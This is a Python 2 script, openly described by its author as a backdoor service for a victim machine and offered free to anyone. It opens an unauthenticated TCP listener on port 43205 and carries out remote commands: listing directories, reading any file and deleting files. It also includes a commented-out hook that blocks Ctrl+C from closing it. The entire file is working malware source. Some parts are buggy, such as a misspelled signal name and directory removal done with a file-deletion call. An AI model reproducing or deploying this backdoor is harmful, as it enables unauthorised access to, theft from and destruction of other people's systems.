#!/usr/bin/env python

#By Muhammad Adnan Aftab
#Code available free for anyone who want to use this or want to extend this functionality

#This Backdoor service which will run on victim machine.
#It will execute commands send by remote client.

#No warranty at all for this code. Use this on your own responsibility.


import threading
import socket
import sys
import signal 
import os
import glob


BUFFER_SIZE = 20048
class CXBackDoor(threading.Thread):
	
	# Constructor method
	# Parameters client socket, client ip and client port
	
	def __init__(self, clientSocket, clientIp, clientPort):
		threading.Thread.__init__(self)
		self.clientSocket = clientSocket
		self.clientIp = clientIp
		self.clientPort = clientPort
	
	def ProcessClientMessage(self,clientMessage):
		#This method will process commands and messages received from client
		
		if clientMessage == 'test':
			return "Service running"
		
		command = clientMessage.split()
		resp = 'Response message'
		if(command[0]=='getcwd'):
			resp = os.getcwd()		
		elif(command[0] == 'listcdir'):
			resp =  str(os.listdir('.'))
		elif(command[0] == 'listrdir'):
			resp = str(os.listdir("/"))
		elif(command[0] == 'listdir'):
			if len(command) > 1:
				print "client ask to list dir : ", command[1]
				resp = str(os.listdir(command[1]))
			else:
				resp = "Directory name missing (should be like '/var)"
		elif(command[0] == 'rmfile'):
			if os.path.isfile(command[1]):
				try:
					os.remove(command[1])
					resp = "File removed successfully"
				except Exception as exp:
					resp = "Exception:"+str(exp.args)
		elif(command[0] == 'rmrdir'):
			if len(command)>1:
				try:
					dirToRemove = command[1]
					os.remove(os.path.join("/",dirToRemove))
					resp = os.path.join("/",dirToRemove)
				except Exception as exp:
					resp = "Exception : "+str(exp.args)

		elif(command[0] == 'rfile'):
 			if len(command) > 1:
				try:
					fileToRead = command[1]
					text = ''
					f = open(fileToRead,'r')
					for line in f.readlines():
						text = text+line
					resp = text
					f.close()
				except Exception as exp:
					resp = "Exception : "+str(exp.args)
			else:
				resp = "File name arameter missing  \n"
					
		elif(command[0] == 'runapp'):
			pass #TODO implement
		elif(command[0] == 'test'):
			print "test service"
			return "service running"
		elif(command[0] == 'dc'):
			self.clientSocket.send("Connection closed")
			return ''
		else:
			"Unknown command"
			resp = "Unkownd command"
		return resp
	
	def run(self):
		#This method will run when thread for new client will start
		self.clientSocket.send("Connection accepted ... \n")
                data = "test data"
                while len(data):
                        data = self.clientSocket.recv(BUFFER_SIZE)
			print data
			if data == 'dcon':
				self.clientSocket.send("Connection closed..\n")
				resp = ''
				break 
			else :
				print "Message received from client"
				resp = self.ProcessClientMessage(data)
				print "Resp : ",resp
                	        self.clientSocket.send(resp+"\n")
				data = resp
		self.clientSocket.close()
                print "Client %s lost"%self.clientIp

#Handling keyboard interupt
def ctrlc_handler(signum,frm):
	print "I am really very sorry, but you can not close me"

#Uncomment this line if you want to handle ctrlc+c (keyboard interurpt)

#signal.signal(signal.SIGING,ctrlc_handler)

#Creating server socket
tcpSocket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
tcpSocket.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
tcpSocket.bind(("0.0.0.0",43205)) #to listen at any ip
clientThreads = []

while True:
	tcpSocket.listen(100)
	print "Backdoor service started"
	(client,(ip,port)) = tcpSocket.accept()
	backDoor = CXBackDoor(client,ip,port)
	backDoor.start()
	clientThreads.append(backDoor)

for thread in clientThreads:
	thread.join()

